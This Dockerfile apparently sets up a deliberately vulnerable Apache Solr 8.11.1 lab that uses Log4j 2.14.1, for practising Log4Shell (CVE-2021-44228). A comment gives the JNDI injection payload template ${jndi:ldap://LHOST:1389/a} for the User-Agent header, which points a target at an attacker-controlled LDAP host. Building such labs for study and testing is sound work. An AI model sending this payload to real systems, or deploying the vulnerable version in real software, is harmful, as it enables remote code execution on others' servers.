FROM eclipse-temurin:8-jdk
# ── Log4Shell — CVE-2021-44228 ───────────────────────────────
# Apache Log4j 2.0 - 2.14.1: JNDI injection via ${jndi:ldap://...}
# Exploit: send ${jndi:ldap://LHOST:1389/a} in User-Agent header
ENV DEBIAN_FRONTEND=noninteractive

# Install Apache Solr 8.11.1 (uses Log4j 2.14.1 — vulnerable)
RUN apt-get update && apt-get install -y wget curl && rm -rf /var/lib/apt/lists/*

WORKDIR /opt
RUN wget -q "https://archive.apache.org/dist/lucene/solr/8.11.1/solr-8.11.1.tgz" || \
    wget -q "https://archive.apache.org/dist/solr/solr/8.11.1/solr-8.11.1.tgz" || true
RUN tar xzf solr-8.11.1.tgz 2>/dev/null || true
RUN mv solr-8.11.1 /opt/solr 2>/dev/null || true

RUN useradd -r -s /bin/false solr 2>/dev/null || true
RUN chown -R solr:solr /opt/solr 2>/dev/null || true

EXPOSE 8983

# Start Solr in standalone mode (not cloud)
CMD ["/bin/bash", "-c", "/opt/solr/bin/solr start -force -p 8983 && tail -f /opt/solr/server/logs/solr.log"]
